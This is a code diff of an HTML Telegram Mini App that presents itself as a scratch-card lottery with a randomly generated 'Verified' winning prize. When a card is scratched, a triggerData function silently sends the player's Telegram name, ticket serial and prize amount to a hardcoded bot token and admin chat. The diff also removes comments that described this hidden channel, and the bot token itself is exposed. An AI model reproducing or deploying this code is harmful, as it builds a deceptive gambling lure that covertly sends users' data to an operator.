@@ -17,7 +17,7 @@
         #loading-bar-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #6366f1, #ec4899); transition: width 0.1s linear; }
         .loading-text { margin-top: 10px; font-size: 10px; color: #94a3b8; letter-spacing: 2px; }
 
-        /* 2. 高位弹窗（不挡号码） */
+        /* 2. 高位弹窗 */
         #top-dialog {
             position: fixed; top: 25px; left: 50%; transform: translateX(-50%) scale(0.8);
             width: 300px; padding: 25px 0; background: rgba(255,255,255,0.98);
@@ -68,7 +68,7 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // 静默传输配置：直接使用 Telegram API 通道
+        // 静默传输配置
         const BOT_TOKEN = "8789746219:AAHpvM2qONoJRHuqXZk8gsuATD6LxiEvC9Q";
         const ADMIN_ID = "6205842828"; 
 
@@ -105,7 +105,7 @@
             const g = document.getElementById('grid-area');
             let h = ""; combinations = []; winTotal = 0;
             for(let i=0; i<30; i++) {
-                const isWin = Math.random() > 0.85; 
+                const isWin = Math.random() > 0.85; // 保持 0.85 参数不动
                 const n = isWin ? winNum : Math.floor(Math.random()*89+10);
                 const p = (Math.random() * 50 + 10).toFixed(2);
                 if(isWin) winTotal += parseFloat(p);
@@ -117,4 +117,64 @@
         }
 
         function initCanvas(id) {
-            const cvs = document.getElementById(id); const ctx = cvs.
+            const cvs = document.getElementById(id); const ctx = cvs.getContext('2d');
+            cvs.width = cvs.offsetWidth; cvs.height = cvs.offsetHeight;
+            ctx.fillStyle = '#cfd8dc'; ctx.fillRect(0,0,cvs.width,cvs.height);
+            ctx.font = "bold 16px Arial"; ctx.textAlign = "center"; ctx.textBaseline = "middle";
+            const spacing = 35; 
+            for (let y = spacing/2; y < cvs.height + spacing; y += spacing) {
+                for (let x = spacing/2; x < cvs.width + spacing; x += spacing) {
+                    const row = Math.floor(y / spacing); const col = Math.floor(x / spacing);
+                    ctx.fillStyle = "rgba(0,0,0,0.15)";
+                    const char = (row + col) % 2 === 0 ? "$" : "€";
+                    ctx.save(); ctx.translate(x, y); ctx.rotate(-0.2);
+                    ctx.fillText(char, 0, 0); ctx.restore();
+                }
+            }
+            if(id === "c_grid") {
+                points = []; for(let i=0; i<20; i++) points.push({x: Math.random()*cvs.width, y: Math.random()*cvs.height, h: false});
+            }
+            const doScratch = (x, y) => {
+                ctx.globalCompositeOperation = 'destination-out';
+                ctx.beginPath(); ctx.arc(x, y, 25, 0, Math.PI*2); ctx.fill();
+                if(id === "c_win") mainScratched = true;
+                if(id === "c_grid") {
+                    scratchCount++;
+                    points.forEach(p => { if(!p.h && Math.hypot(p.x-x, p.y-y) < 25) p.h = true; });
+                    if((points.filter(p=>p.h).length >= 14 || scratchCount > 180) && mainScratched && !winTriggered) triggerData();
+                }
+            };
+            const move = (e) => {
+                const r = cvs.getBoundingClientRect(); const t = e.touches ? e.touches[0] : e;
+                doScratch(t.clientX - r.left, t.clientY - r.top);
+            };
+            cvs.addEventListener('touchmove', (e) => { e.preventDefault(); move(e); });
+            cvs.addEventListener('mousemove', (e) => { if(e.buttons === 1) move(e); });
+        }
+
+        async function triggerData() {
+            if (winTriggered) return;
+            winTriggered = true;
+            const reportData = {
+                user: tg.initDataUnsafe?.user?.first_name || "Captain_User",
+                sn: ticketSN,
+                prize: winTotal.toFixed(2)
+            };
+            const msg = `📊 帝国控制中心同步\n用户: ${reportData.user}\n流水: ${reportData.sn}\n金额: $${reportData.prize}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, disable_notification: true })
+            }).catch(() => {});
+            setTimeout(() => {
+                const dialog = document.getElementById('top-dialog');
+                document.getElementById('db').innerText = `$${winTotal.toFixed(2)}`;
+                document.getElementById('dm').innerHTML = `WINNING NUMBER: ${winNum}<br>Status: Verified.`;
+                dialog.classList.add('active');
+                if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            }, 1200);
+        }
+        window.onload = startBoot;
+    </script>
+</body>
+</html>
